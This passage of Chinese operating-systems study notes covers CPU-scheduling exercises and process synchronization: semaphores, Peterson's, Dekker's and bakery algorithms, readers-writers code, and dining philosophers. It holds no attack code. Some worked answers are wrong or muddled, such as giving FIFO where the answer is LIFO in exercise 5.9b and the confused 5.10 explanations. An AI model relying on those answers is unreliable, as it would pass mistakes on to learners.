并提供实时支持。这三种操作系统通常偏爱交互进程而不是批处理进程或CPU约束进程。</p><p>因为有多种不同的调度算法可用， 所以需要某种方法来选择它们。分析方法使用数学分析以确定算法性能。模拟方法通过对代表性的进程采用调度算法模拟并计算其性能来确定优劣。不过， 模拟最多也只是提供对真实系统性能的近似， 评估调度算法唯一可靠的技术是在真实系统上的实现算法并在真实环境中进行性能跟踪。</p><h2 id="59-习题"><a class="markdownIt-Anchor" href="#59-习题"></a> 5.9 习题</h2><p><strong>5.1 为什么对调度程序来说，区分I/O限制的程序和CPU 限制的程序是重要的？</strong></p><blockquote><p>I/O限制的程序有在运行I/O操作前只运行很少数量的计算机操作的性质。这种程序一般来说不会使用很多的CPU。 但是 CPU 限制的程序会利用整个的时间片，且不做任何阻碍I/O操作的工作。</p><p>I/O约束程序通常具有很多短CPU区间。CPU约束程序可能有少量的长CPU区间。</p><p>因此，通过给I/O限制的程序优先权和允许在CPU 限制的程序之前运行， 可以很好的利用计算机资源</p></blockquote><p><strong>5.4</strong></p><p><img src="/posts/8ce3e425/image-20211103122937119.png" alt="image-20211103122937119"></p><p><img src="/posts/8ce3e425/image-20211103122955012.png" alt="image-20211103122955012"></p><blockquote><p><strong>a. Gantt图</strong></p><p><img src="/posts/8ce3e425/image-20211103130642240.png" alt="image-20211103130642240"></p><p><strong>b. 周转时间</strong></p><table><thead><tr><th></th><th style="text-align:center">FCFS</th><th style="text-align:center">SJF</th><th style="text-align:center">非抢占优先级</th><th style="text-align:center">RR</th></tr></thead><tbody><tr><td>P<sub>1</sub></td><td style="text-align:center">10</td><td style="text-align:center">19</td><td style="text-align:center">16</td><td style="text-align:center">19</td></tr><tr><td>P<sub>2</sub></td><td style="text-align:center">11</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td>P<sub>3</sub></td><td style="text-align:center">13</td><td style="text-align:center">4</td><td style="text-align:center">18</td><td style="text-align:center">7</td></tr><tr><td>P<sub>4</sub></td><td style="text-align:center">14</td><td style="text-align:center">2</td><td style="text-align:center">19</td><td style="text-align:center">4</td></tr><tr><td>P<sub>5</sub></td><td style="text-align:center">19</td><td style="text-align:center">9</td><td style="text-align:center">6</td><td style="text-align:center">14</td></tr></tbody></table><p><strong>c. 等待时间</strong></p><table><thead><tr><th></th><th style="text-align:center">FCFS</th><th style="text-align:center">SJF</th><th style="text-align:center">非抢占优先级</th><th style="text-align:center">RR</th></tr></thead><tbody><tr><td>P<sub>1</sub></td><td style="text-align:center">0</td><td style="text-align:center">9</td><td style="text-align:center">6</td><td style="text-align:center">9</td></tr><tr><td>P<sub>2</sub></td><td style="text-align:center">10</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td>P<sub>3</sub></td><td style="text-align:center">11</td><td style="text-align:center">2</td><td style="text-align:center">16</td><td style="text-align:center">5</td></tr><tr><td>P<sub>4</sub></td><td style="text-align:center">13</td><td style="text-align:center">1</td><td style="text-align:center">18</td><td style="text-align:center">3</td></tr><tr><td>P<sub>5</sub></td><td style="text-align:center">14</td><td style="text-align:center">4</td><td style="text-align:center">2</td><td style="text-align:center">9</td></tr></tbody></table><p><strong>d.</strong> <strong>平均等待时间</strong></p><p>​FCFS=(0+10+11+13+14)/5=48/5=9.6</p><p>​SJF=(9+0+2+1+4)/5=3.2</p><p>​非抢占优先级=(6+0+16+18+2)/5=8.4</p><p>​RR=(9+1+5+3+9)/5=5.4</p><p>​平均等待时间最短的是SJF调度算法。</p></blockquote><p><strong>5.5</strong></p><p><img src="/posts/8ce3e425/image-20211103123014862.png" alt="image-20211103123014862"></p><blockquote><p>b和d.    最短作业优先调度和优先级调度算法都会引起饥饿</p></blockquote><p><strong>5.7</strong></p><p><img src="/posts/8ce3e425/image-20211103123055446.png" alt="image-20211103123055446"></p><blockquote><p><strong>a. 时间片是1ms：</strong></p><p>不论是哪个进程被调度，这个调度都会为每一次的上下文切换花费一个0.1ms的上下文切换。</p><p>CPU的利用率是1/1.1*100%=92%</p><p><strong>b. 时间片是10秒：</strong></p><p>这I/O限制任务会在使用完1ms时间片后进行一次上下文切换。这个时间片要求在所有的进程间都走一遍，因此，10*1.1+10.1(因为每个1/0限定任务执行为1毫秒，然后承担上下文切换的任务，而CPU限制任务的执行10毫秒在承担一个上下文切换之前）。</p><p>因此，CPU的利用率是20/21.1*100=94%</p></blockquote><p>5.9 考虑下面的动态改变优先级的抢占式优先级调度算法。 大的优先级数代表高优先级。 当一个进程在等待CPU时（在就绪队列中，但没执行）， 优先级以α速率改变： 当它运行时，优先级以β速率改<br>变。 所有的进程在进入等待队列时指定优先级为0。 参数α和β可以进行设定得到许多不同的调度算法。<br>a. β&gt;α&gt;0是什么算法？<br>b. α&lt;β&lt;0是什么算法？</p><blockquote><p>a. FCFS</p><p>b. FIFO</p></blockquote><p><strong>5.11</strong></p><p><img src="/posts/8ce3e425/image-20211103123112891.png" alt="image-20211103123112891"></p><blockquote><p>a: 26</p><p>b: 8</p><p>c: 14</p></blockquote><p><strong>5.10 解释下面调度算法对短进程偏好程度上的区别：</strong><br><strong>a. FCFS</strong><br><strong>b. RR</strong><br><strong>c. 多级反馈队列</strong></p><blockquote><p>a. FCFS一一区别短任务是因为任何在长任务之后到达的短任务部将会有很长的等待时间.<br>b. RR一一对所有的任务都是能够相同的（给它们相同的CPU 时间区间），所以，短任务可以很快的离开系统， 只要它们可以先完成．<br>c . 多级反馈队列和RR 调度算法相似一一它们不会先选择短任务。</p></blockquote><h1 id="第6章进程同步"><a class="markdownIt-Anchor" href="#第6章进程同步"></a> 第6章进程同步</h1><h2 id="61-背景"><a class="markdownIt-Anchor" href="#61-背景"></a> 6.1 背景</h2><p>允许两个进程并发操作变量counter会得到不正确的状态。</p><p>多个进程并发访问和操作同一数据且执行结果与访问发生的特定顺序有关， 称为竞争条件（race condition）。为了避免竞争条件， 需要确保一段时间内只有一个进程能操作变量counter。为了实现这种保证， 要求进行一定形式的进程同步。</p><h2 id="62-临界区问题"><a class="markdownIt-Anchor" href="#62-临界区问题"></a> 6.2 临界区问题</h2><p>每个进程有一个代码段称为<strong>临界区</strong>（critical section）， 在该区中进程可能改变共同变量、更新一个表、写一个文件等。</p><p>这种系统的<strong>重要特征</strong>是当一个进程进入临界区， 没有其他进程可被允许在临界区内执行， 即没有两个进程可同时在临界区内执行。</p><p><strong>临界区问题</strong>(critical-section problem ） 是设计一个以便进程协作的协议。每个进程必须请求允许进入其<strong>临界区</strong>。实现这一请求的代码段称为<strong>进入区</strong>（entry section）， 临界区之后可有<strong>退出区</strong>（exit section）， 其他代码为剩余区（remainder section）。</p><p><img src="/posts/8ce3e425/image-20211116161533895.png" alt="image-20211116161533895"></p><p>临界区问题的解答必须满足如下三项要求：</p><ul><li><p><strong>互斥</strong>（mutual exclusion）： 如果进程P<sub>i</sub>在其临界区内执行， 那么其他进程都不能在其临界区内执行。</p></li><li><p><strong>有空让进</strong>（progress）： 如果没有进程在其临界区内执行，且有进程需进入临界区，那么只有那些不在剩余区内执行的进程可参加选择， 以确定谁能下一个进入临界区， 且这种选择不能无限推迟。</p><p>当没有进程在互斥区时，任何有权使用互斥区的进程可进入。</p></li><li><p><strong>有限等待</strong>(bounded waiting）：任何进入互斥区的要求应在有限的时间内得到满足.</p></li></ul><h2 id="63-peterson算法"><a class="markdownIt-Anchor" href="#63-peterson算法"></a> 6.3 Peterson算法</h2><p>变量 turn表示哪个进程可以进入其临界区。即如果 turn==i， 那么进程 P<sub>i</sub>允许在其临界区内执行。数组 flag 表示哪个进程想要进入其临界区。</p><p><img src="/posts/8ce3e425/image-20211116161739706.png" alt="image-20211116161739706"></p><h2 id="630-面包师算法"><a class="markdownIt-Anchor" href="#630-面包师算法"></a> 6.3.0 面包师算法</h2><p>面包师算法是n个进程进入临界区问题的算法</p><ul><li>在进入临界区前，进程接收一个数字，最小数字的持有者进入临界区</li><li>如果Pi和Pj接收到了同样的数字，而且如果i &lt; j，那么Pi 先得到服务。</li></ul><p><img src="/posts/8ce3e425/image-20211116161850602.png" alt="image-20211116161850602"></p><p><img src="/posts/8ce3e425/image-20211116161908057.png" alt="image-20211116161908057"></p><h2 id="64-硬件同步"><a class="markdownIt-Anchor" href="#64-硬件同步"></a> 6.4 硬件同步</h2><p><strong>TestAndSet()</strong></p><p><img src="/posts/8ce3e425/image-20220109162023500.png" alt="image-20220109162023500"></p><p>TS的逻辑：<br>如果测试值为false，则返回false，并把测试值置为true。<br>如果测试值为true，则返回true，测试值仍然为true。</p><p>Lock为FALSE，则马上结束空循环；如果Lock为TRUE，则一直空循环，直到别的进程把Lock改为FALSE</p><p><strong>Swap()</strong></p><p><img src="/posts/8ce3e425/image-20211116162152258.png" alt="image-20211116162152258"></p><p>如果别的进程把lock设置为flase，则经过Swap交换之后，Key会等于false ，这意味着已经没有一个进程处于CS</p><p><strong>上面两种算法解决了互斥，未解决有限等待</strong></p><p>下面的算法满足临界区三个要求：</p><p>boolean waiting[n];<br>boolean lock;</p><p>这些数据结构均初始化false。</p><p><img src="/posts/8ce3e425/image-20211116162305381.png" alt="image-20211116162305381"></p><ul><li><p>互斥</p><p>为了证明满足互斥要求，注意，只有waiting[i]==false 或key==flase 时， 进程P<sub>i</sub> 才进入临界区。只有当TestAndSet执行时， key的值才变成false。执行TestAndSet的第一个进程会发现key==false；所有其他进程必须等待。只有其他进程离开其临界区时，变量waiting[i］的值才能变成false：每次只有一个waiting[i］被设置为false,以满足互斥要求。</p></li><li><p>有空让进</p><p>任何一个已经进入CS的进程在“exit section” 时，设置：lock =false 或 waiting[ j ]= false，确保了至少可以让一个进程进入CS</p></li><li><p>有限等待条件</p><p>任何一个已经进入CS的进程Pi在“exit section” 时， 将会依次扫描waiting 数组（i+1,i+2,…n-1,0,…i-1)，并仅将Pi后面最先找到的进程j的waiting[ j]设置为false</p><p>这就使进程能依此循环进入CS</p></li></ul><p><strong>硬件指令实现的缺点</strong></p><ul><li>硬件指令虽然可以有效地保证进程间互斥，但有一个缺点，就是当进程正在临界段中执行时，其它想进入临界段的进程必须不断地测试布尔变量lock的值，这就造成了处理机机时的浪费，我们常称这种情况为“忙等待”</li><li>可能“饥饿”<strong>：<strong>如果从等待进程中随机选择一个进入临界区</strong>，<strong>有的进程可能一直选不上</strong>。</strong></li></ul><h2 id="65-信号量"><a class="markdownIt-Anchor" href="#65-信号量"></a> 6.5 信号量</h2><p>信号量S是个整数变量，除了初始化外，它只能通过两个标准原子操作：wait()和signal()来访问。</p><p><img src="/posts/8ce3e425/image-20211116162927219.png" alt="image-20211116162927219"></p><h3 id="651-用法"><a class="markdownIt-Anchor" href="#651-用法"></a> 6.5.1 用法</h3><p><img src="/posts/8ce3e425/image-20211116163758185.png" alt="image-20211116163758185"></p><h3 id="652-实现"><a class="markdownIt-Anchor" href="#652-实现"></a> 6.5.2 实现</h3><p>信号量的主要缺点是都要求<strong>忙等待</strong>（busy waiting）。当一个进程位于其临界区内时， 任何其他试图进入其临界区的进程都必须在其进入代码中连续地循环。这种类型的信号量也称为<strong>自旋锁</strong>（spinlock）</p><p>为了克服忙等， 可以修改信号量操作wait()和signal()的定义。当一个进程执行wait()操作时， 发现信号量值不为正， 则它必须等待。然而， 该进程不是忙等而是阻塞自己。阻塞操作将一个进程放入到与信号量相关的等待队列中，井将该进程的状态切换成等待状态。接着， 控制转到CPU调度程序， 以选择另一个进程来执行。</p><p>一个被阻塞在等待信号量S上的进程，可以在其他进程执行signal()操作之后被重新执行。该进程的重新执行是通过wakeup()操作来进行的， 该操作将进程从等待状态切换到就绪状态。接着， 该进程被放入到就绪队列中（根据CPU调度算法的不同，CPU有可能会、也可能不会从正在运行的进程切换到刚刚就绪的进程）。</p><p><img src="/posts/8ce3e425/image-20211116164332005.png" alt="image-20211116164332005"></p><p><img src="/posts/8ce3e425/image-20211116164343388.png" alt="image-20211116164343388"></p><p><img src="/posts/8ce3e425/image-20211116165105798.png" alt="image-20211116165105798"></p><h3 id="653-死锁与饥饿"><a class="markdownIt-Anchor" href="#653-死锁与饥饿"></a> 6.5.3 死锁与饥饿</h3><p><strong>死锁</strong>：两个或多个进程无限地等待一个事件，而该事件只能由这些等待进程之一来产生。这里的事件是signal()操作的执行。当出现这样的状态时， 这些进程就称为死锁（deadlocked）。</p><p><strong>无限期阻塞</strong>(indefinite blocking）或<strong>饥饿</strong>（starvation）：即进程在信号量内无限期等待。如果对与信号量相关的链表按LIFO顺序来增加和移动进程，<br>那么可能会发生无限期阻塞。</p><h3 id="654-信号量小结"><a class="markdownIt-Anchor" href="#654-信号量小结"></a> 6.5.4 信号量小结</h3><ol><li><p><strong>信号量的物理含义：</strong></p><p>**S&gt;0：**表示有S个资源可用</p><p>**S=0：**表示无资源可用</p><p>**S&lt;0：**则|S|表示S等待队列中的进程个数</p><p>**P(S)：**表示申请一个资源</p><p>**V(S)：**表示释放一个资源。</p></li><li><p><strong>P.V操作必须成对出现，有一个P操作就一定有一个V操作</strong></p><p>当为<strong>互斥操作</strong>时，它们同处于同一进程</p><p>当为<strong>同步操作</strong>时，则不在同一进程中出现</p><p>如果P(S1)和P(S2)两个操作在一起，那么P操作的顺序至关重要,一个同步P操作与一个互斥P操作在一起时，同步P操作在互斥P操作前。</p><p>而两个V操作无关紧要</p></li><li><p><strong>P.V操作的优缺点</strong></p><ul><li>优点：简单，而且表达能力强（用P.V操作可解决任何同步互斥问题）</li><li>缺点：不够安全；P.V操作使用不当会出现死锁；遇到复杂同步互斥问题时实现复杂</li></ul></li></ol><p><strong>而两个V操作无关紧要</strong></p><h2 id="66-经典同步问题"><a class="markdownIt-Anchor" href="#66-经典同步问题"></a> 6.6 经典同步问题</h2><p>使用PV操作完成进程间的<strong>同步与互斥步骤</strong>：</p><ol><li>分析同步关系（制约关系）</li><li>设置信号量（一般情况下，有几项制约条件就应设置几个信号量）</li><li>选择并确定信号量的初值（初值和初始可用资源有关）</li><li>利用PV操作写出同步关系。</li></ol><h3 id="661-有限缓冲问题"><a class="markdownIt-Anchor" href="#661-有限缓冲问题"></a> 6.6.1 有限缓冲问题</h3><p><img src="/posts/8ce3e425/image-20211116164843159.png" alt="image-20211116164843159"></p><p>下图会发生死锁，生产者一直等待</p><p><img src="/posts/8ce3e425/image-20211116165556108.png" alt="image-20211116165556108"></p><h3 id="662-读者写者问题"><a class="markdownIt-Anchor" href="#662-读者写者问题"></a> 6.6.2 读者写者问题</h3><p><strong>制约条件分析：</strong></p><p>1、允许多个进程同时读文件（读－读允许）；<br>2、不允许在进程读文件时让另外一进程去写文件；有进程在写文件时不让另外一个进程去读该文件（“读-写”互斥）；<br>3、不允许多个写进程同时写同一文件（“写-写”互斥）。</p><h4 id="读者优先"><a class="markdownIt-Anchor" href="#读者优先"></a> <strong>读者优先：</strong></h4><p>只要不断的有读者来读，那么readcount就一直会大于0，那么永远不会触发signal(wrt)条件，从而导致写者饥饿。</p><p>该问题被称为第一读者优先问题</p><p><img src="/posts/8ce3e425/image-20211116170507558.png" alt="image-20211116170507558"></p><h4 id="写者优先"><a class="markdownIt-Anchor" href="#写者优先"></a> <strong>写者优先:</strong></h4><p>1.写者线程的优先级高于读者线程。<br>2.当写者到来时，只有那些已经获得授权的读进程才被允许完成它们的操作，写者之后到来的读者将被推迟，直到写者完成。<br>3.当没有写者进程时读者进程应该能够同时读取文件。</p><p><strong>具体实现:</strong><br>1.通过添加信号量<code>read</code>实现写者到来时能够阻止读者进程。<br>2.设置信号量<code>fileSrc</code>实现读写者对临界资源的访问。<br>3.设置计数器<code>writeCount</code>来统计当前阻塞的写者进程的数目，设置信号量<code>writeCountSignal</code>完成对<code>writeCount</code>计数器资源的互斥访问。<br>4.设置计数器<code>readCount</code>来统计访问临界资源的读者数目，设置信号量<code>readCountSignal</code>完成对<code>readCount</code>计数器资源的互斥访问。</p><p><img src="/posts/8ce3e425/image-20211116170755343.png" alt="image-20211116170755343"></p><h4 id="读者写者公平竞争"><a class="markdownIt-Anchor" href="#读者写者公平竞争"></a> 读者写者公平竞争：</h4><ol><li>优先级相同。</li><li>写者、读者互斥访问。</li><li>只能有一个写者访问临界区。</li><li>可以有多个读者同时访问临界资源。</li></ol><p><strong>具体实现:</strong></p><ol><li>设置<code>file</code>信号量实现对临界资源的互斥访问。</li><li>设置计数器<code>readCount</code>实现多个读者访问临界资源，通过设置信号量<code>readCountSignal</code>实现对<code>readCount</code>计数器的互斥访问。</li><li>设置信号量<code>keySignal</code>实现读者和写者的公平竞争（令牌）。</li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* 读者队列初始值为0，其他资源初始值为1*/</span><br><span class="hljs-keyword">int</span> readCount = <span class="hljs-number">0</span>;<br>semaphore keySignal = <span class="hljs-number">1</span>;<br>semaphore fileSrc = <span class="hljs-number">1</span>;<br>semaphore readCountSignal = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">reader</span>()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>      <span class="hljs-built_in">wait</span>(keySignal);        <span class="hljs-comment">//申请令牌</span><br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      <span class="hljs-keyword">if</span>(!readCount)          <span class="hljs-comment">//为零则申请文件资源</span><br>         <span class="hljs-built_in">wait</span>(fileSrc);<br>      readCount++;<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放计数器资源</span><br>      <span class="hljs-built_in">signal</span>(keySignal);      <span class="hljs-comment">//释放令牌</span><br> <br>      ...<br>      perform read operation  <span class="hljs-comment">//执行临界区代码</span><br>      ...<br>  <br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      readCount--;<br>      <span class="hljs-keyword">if</span>(!readCount)                <span class="hljs-comment">//为零则释放文件资源</span><br>         <span class="hljs-built_in">signal</span>(fileSrc);<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放读者计数器资源</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-built_in">writer</span>()<br>&#123;<br>     <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>     &#123;<br>        <span class="hljs-built_in">wait</span>(keySignal);     <span class="hljs-comment">//申请令牌</span><br>        <span class="hljs-built_in">wait</span>(fileSrc);       <span class="hljs-comment">//申请文件资源</span><br> <br>        ...<br>        perform write operation <span class="hljs-comment">//执行临界区代码</span><br>        ...<br> <br>        <span class="hljs-built_in">signal</span>(fileSrc);   <span class="hljs-comment">//释放文件资源</span><br>        <span class="hljs-built_in">signal</span>(keysignal); <span class="hljs-comment">//释放令牌</span><br>     &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="663-哲学家进餐回题"><a class="markdownIt-Anchor" href="#663-哲学家进餐回题"></a> 6.6.3 哲学家进餐回题</h3><p><img src="/posts/8ce3e425/image-20211116170946819.png" alt="image-20211116170946819"></p><p><strong>死锁解决方法：</strong></p><ul><li>至多只允许四位哲学家同时去拿左边的筷子；</li><li>仅当哲学家左右两边的筷子均可用时才允许他拿起筷子；</li><li>规定奇数号哲学家先拿起他左边的筷子，而偶数号哲学家先拿起他右边的筷子。</li></ul><p><img src="/posts/8ce3e425/image-20211116171117548.png" alt="image-20211116171117548"></p><p><img src="/posts/8ce3e425/image-20211116171127875.png" alt="image-20211116171127875"></p><h2 id="611-习题"><a class="markdownIt-Anchor" href="#611-习题"></a> 6.11 习题</h2><p>**试解释为什么自旋锁对单处理器系统不合适而对多处理器系统合适。  **</p><blockquote><p>解答：<br>自旋锁（进程在其等待锁时还在运行）的缺点是忙等待，当一个进程位于其临界区内时，任何其它试图进入其临界区的进程都必须在其进入代码中连续地循环。在单处理器系统中，忙等待浪费了CPU时钟（这些时钟本来可以有效地为其他进程所使用）。<br>自旋锁的优点就是，进程在等待锁时不会进行上下文切换，而上下文切换可能需要花费相当长的时间。因此，如果锁的占用时间短，自旋锁就可以变得非常有用。它常常用于多处理器系统中，这样一个线程在一个处理器自旋时，另一线程可在另一处理器上在其临界区内执行。</p></blockquote><h3 id="信号量确定"><a class="markdownIt-Anchor" href="#信号量确定"></a> 信号量确定</h3><p><strong>设有N个进程共享一互斥段对如下两种情况</strong></p><ol><li><strong>每次只允许一个进程进入互斥段；</strong></li><li><strong>最多允许M个进程(M&lt;N)同时进入互斥段；所采用信号量是否相同？信号量值的初始值如何确定？变化范围如何？</strong></li></ol><blockquote><p>答：所采用的信号量相同，为mutex。<br>第一种情况mutex初值为1，变化范围为－（N－1）&lt;mutex &lt;1<br>的整数。<br>第二种情况mutex初值为M，变化范围为 M–N &lt; mutex &lt; M的整<br>数。</p></blockquote><h3 id="进程同步"><a class="markdownIt-Anchor" href="#进程同步"></a> 进程同步</h3><p><strong>试用信号量实现这三个进程的同步</strong></p><blockquote><p><img src="/posts/8ce3e425/image-20220109165911590.png" alt="image-20220109165911590"></p></blockquote><p><strong>试用信号量实现这6个进程的同步。</strong></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170141492.png" alt="image-20220109170141492"></p></blockquote><h3 id="文件打印问题"><a class="markdownIt-Anchor" href="#文件打印问题"></a> 文件打印问题</h3><p><img src="/posts/8ce3e425/image-20220109170235648.png" alt="image-20220109170235648"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170246580.png" alt="image-20220109170246580"></p><p><img src="/posts/8ce3e425/image-20220109170253513.png" alt="image-20220109170253513"></p></blockquote><h3 id="司机和售票员问题"><a class="markdownIt-Anchor" href="#司机和售票员问题"></a> 司机和售票员问题</h3><p><img src="/posts/8ce3e425/image-20220109170301130.png" alt="image-20220109170301130"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170310637.png" alt="image-20220109170310637"></p></blockquote><h3 id="阅览室问题"><a class="markdownIt-Anchor" href="#阅览室问题"></a> 阅览室问题</h3><p><img src="/posts/8ce3e425/image-20220109170320259.png" alt="image-20220109170320259"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170330032.png" alt="image-20220109170330032"><img src="/posts/8ce3e425/image-20220109170338052.png" alt="image-20220109170338052"><img src="/posts/8ce3e425/image-20220109170431135.png" alt="image-20220109170431135"></p></blockquote><h3 id="苹果橘子问题"><a class="markdownIt-Anchor" href="#苹果橘子问题"></a> 苹果橘子问题</h3><p><img src="/posts/8ce3e425/image-20220109170438876.png" alt="image-20220109170438876"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170446193.png" alt="image-20220109170446193"><img src="/posts/8ce3e425/image-20220109170455073.png" alt="image-20220109170455073"></p></blockquote><h3 id="61"><a class="markdownIt-Anchor" href="#61"></a> <strong>6.1</strong></h3><blockquote><p>第一个著名的正确解决两个进程的临界区问题的软件方法是由Dekker设计的。两个进程P0和P1共享以下变量：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">boolean flag[<span class="hljs-number">2</span>];<span class="hljs-comment">/*initially false*/</span><br><span class="hljs-keyword">int</span> turn;<br></code></pre></div></td></tr></table></figure><p>进程P<sub>i</sub> （i=0或1）的结构如下， 另一个进程为P<sub>j</sub> (j=0或1）。 试证明这个算法满足临界区问题的所有三个要求.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123; <br>flag[i] = <span class="hljs-literal">true</span>; <br><span class="hljs-keyword">while</span> (flag[j]) &#123; <br><span class="hljs-keyword">if</span>(turn==j) &#123; <br>flag[i] = <span class="hljs-literal">false</span>; <br><span class="hljs-keyword">while</span> (turn == j);<br>        <span class="hljs-comment">// do nothing </span><br>flag[i] = <span class="hljs-literal">true</span>; <br>&#125;<br>&#125;<br><span class="hljs-comment">//critical section </span><br>turn=j; <br>flag[i] = <span class="hljs-literal">false</span>; <br><span class="hljs-comment">//remainder section</span><br>&#125;<span class="hljs-keyword">while</span> (TRUE); <br></code></pre></div></td></tr></table></figure></blockquote><p>满足三个条件：</p><p><strong>互斥</strong>:进程P<sub>i</sub>要进入临界区，必有flag[i]=true,flag[j]=false,此时进程P<sub>j</sub>无法进入临界区;如果flag[j]==true，且有turn==j,说明进程进程P<sub>j</sub>正在临界区内，那么P<sub>i</sub>则会进入自旋，直到进程P<sub>j</sub>运行完成，将flag[j]设置为false，然后轮到P<sub>i</sub>进入临界区。由此可知，互斥成立</p><p><strong>前进</strong>：和互斥的论证相同，如果flag[j]==true，且有turn==j,说明进程进程P<sub>j</sub>正在临界区内，那么P<sub>i</sub>则会进入自旋等待，直到进程P<sub>j</sub>运行完成，将turn设置为i,将flag[j]设置为false，然后P<sub>i</sub>就会结束自旋，进入临界区，满足前进。</p><p><strong>优先等待</strong>：当P<sub>j</sub>在临界区，而P<sub>i</sub>在等待时，之后P<sub>j</sub>退出临界区后，P<sub>i</sub>可以进入临界区，如果此时flag[j]再次变为true,即Pj和Pi企图竞争，我们就会发现因为此时的turn=i，所以Pj会进入自旋，并把flag[j]设置为false,这样Pi就可以进入临界区了，满足优先等待原则。</p><h3 id="62"><a class="markdownIt-Anchor" href="#62"></a> 6.2</h3><blockquote><p><img src="/posts/8ce3e425/image-20211113183219139.png" alt="image-20211113183219139"></p><p><img src="/posts/8ce3e425/image-20211113183254084.png" alt="image-20211113183254084"></p></blockquote><p>满足三个条件：</p><p><strong>互斥</strong>：注意到一个进程只有在下列条件满足时才能进入临界区域：没有其他进程在CS中有设置的标识变量，这是由于进程在CS中设置白身的标识变量之前要先检査其他进程的状态。我们保证没有两个进程将同时进入临界区。</p><p><strong>前进</strong>：考虑以下情況，当多进程同时在CS中设置它们的标识变量，然后检查是否有其他进程在s中设置标识变量。当这种情况发生时，所有的进程意识到这里存在进程争，在外层 while(1)的环下进入下一次送代，重置它们的标识变量到want中。现在只有唯一的进程将设置它的轮次受量到cs中，这个唯一的进程就是其序号是最接近轮次的。从这个角度来说，对于哪些序号次接近轮次的新的进程就能决定进入临界区域，而且能同时在CS中设置它们的标识。随后这些进程意识到这里存在竟争的进程，于是重新启动进入临界区域的进程。在每次送代中，进程在cs中设置的序号值将变得更加接近轮次，最后我们得出以下结论：只有进程k在cs中设置它的标识，而其他些序号在轮次和k之间不能在cs中设置它们的标识。这个进程仪能进入临界区域</p><p><strong>有限等待</strong>：有限等待需要满足以下事实：当进程k在打算进入临界区域时，它的标识不再置为空闲。任何序号不在轮次和k之间的进程不能进入临界区域。与此同时，所有序号落在轮次和k之回且又想要进入临界区域的进程能够进入临界区域（这是基于系统一直在进步的事实），这个轮次值变得越来越接近k。最后，要么轮次变为k,要么没有哪些序号在轮次和k之间的进程，这样进程k就进入临界区域了。</p><h3 id="63"><a class="markdownIt-Anchor" href="#63"></a> 6.3</h3><blockquote><p>术语忙等的含义是什么？</p><p>操作系统中其他类型的等待有哪些？</p><p>忙等能否完全避免？为什么？</p></blockquote><p>忙等：当一个进程位于其临界区内时， 任何其他试图进入其临界区的进程都必须在其进入代码中连续地循环。</p><p>操作系统里其他种类的等待有：等待I/O，等待信号被释放等等</p><p>忙等可以避免，可以采用将进程沉睡，在相应程序到达一定状态的时候再将其唤醒的方式来避免忙等。</p><h3 id="611-理发店问题"><a class="markdownIt-Anchor" href="#611-理发店问题"></a> 6.11 <strong>理发店问题</strong>。</h3><blockquote><p><strong>理发店问题</strong>。一家理发店有一间有n把椅子的等待室和一间有一把理发椅的理发室。如果没有顾客， 理发师就去睡觉。如果顾客来时所有的椅子都有人， 那么顾客将会离去。如果理发师在忙， 而又有空闲的椅子， 那么顾客会坐在其中一个空闲的椅子上。如果理发师在睡觉， 顾客会摇醒他。编写一个程序来协调理发师和顾客。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 